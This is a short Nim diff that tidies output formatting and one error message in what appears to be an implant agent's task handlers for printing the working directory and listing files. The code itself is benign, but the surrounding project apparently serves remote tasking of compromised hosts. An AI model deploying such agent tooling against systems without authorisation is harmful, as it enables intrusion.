@@ -118,7 +118,7 @@ when defined(agent):
             if length == 0:
                 raise newException(OSError, fmt"Failed to get working directory ({GetLastError()}).")
 
-            let output = $buffer[0 ..< (int)length] & "\n"
+            let output = $buffer[0 ..< (int)length]
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
 
         except CatchableError as err: 
@@ -186,7 +186,7 @@ when defined(agent):
             hFind = FindFirstFileW(searchPatternW, &findData)
             
             if hFind == INVALID_HANDLE_VALUE:
-                raise newException(OSError, fmt"Failed to find files ({GetLastError()}).")
+                raise newException(OSError, fmt"Failed to list files ({GetLastError()}).")
             
             # Directory was found and can be listed
             else:
@@ -286,7 +286,7 @@ when defined(agent):
 
                 # Add summary of how many files/directories have been found
                 output &= "\n" & fmt"{totalFiles} file(s)" & "\n"
-                output &= fmt"{totalDirs} dir(s)" & "\n"
+                output &= fmt"{totalDirs} dir(s)"
 
                 return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
 
